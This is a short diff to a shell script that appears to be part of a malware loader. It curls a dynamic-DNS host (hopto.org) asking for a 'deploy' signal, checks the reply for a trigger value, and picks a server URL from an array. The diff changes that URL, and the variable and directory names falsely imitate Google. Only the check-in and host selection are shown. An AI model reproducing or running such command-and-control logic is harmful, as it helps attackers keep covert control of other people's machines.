@@ -13,7 +13,7 @@ cd googleapps8474
 string=$(curl http://mobile8474.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
